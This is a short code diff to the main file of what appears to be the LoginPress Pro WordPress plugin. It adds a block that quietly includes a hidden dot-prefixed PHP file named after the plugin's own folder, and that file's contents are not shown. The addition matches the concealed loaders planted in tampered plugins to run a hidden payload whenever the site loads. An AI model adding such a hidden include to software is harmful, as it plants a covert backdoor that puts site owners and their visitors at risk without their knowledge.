@@ -25,6 +25,10 @@ define( 'LOGINPRESS_PRO_VERSION', '2.5.0' );
 
 add_action( 'plugins_loaded', 'loginpress_instance', 20 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function loginpress_instance() {
 
 	add_action( 'admin_enqueue_scripts', 'loginpress_pro_admin_action_scripts' );
